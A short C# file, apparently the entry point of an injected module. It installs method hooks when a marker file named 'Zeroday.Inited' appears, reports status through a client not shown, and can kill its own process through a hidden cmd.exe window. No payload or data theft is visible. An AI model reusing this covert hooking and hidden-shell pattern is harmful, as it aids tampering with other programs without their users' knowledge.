using Inited;
using Microsoft;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Eva
{
    public class StartMain
    {
        private static bool inited;

        public static void Init()
        {
            try
            {
                if (File.Exists("C:\\Zeroday.Inited") == true)
                {
                    if (inited)
                    {
                        return;
                    }
                    File.Delete("C:\\Zeroday.Inited");
                    inited = true;
                    MethodHook.Install();
                    StaticClient.send("Method Install Inited","" );
                    return;
                }
            }
            catch (Exception ex)
            {
                StaticClient.send("inited exception:", ex.ToString());
            }
            return;
        }

        public static void killMe(int pid = -1)
        {
            if (pid <= 0)
            {
                pid = Process.GetCurrentProcess().Id;
            }
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            string text = "taskkill /PID " + pid;
            process.StandardInput.WriteLine(text + "&exit");
            process.StandardInput.AutoFlush = true;
            process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            Process.GetCurrentProcess().Kill();
        }
    }
}
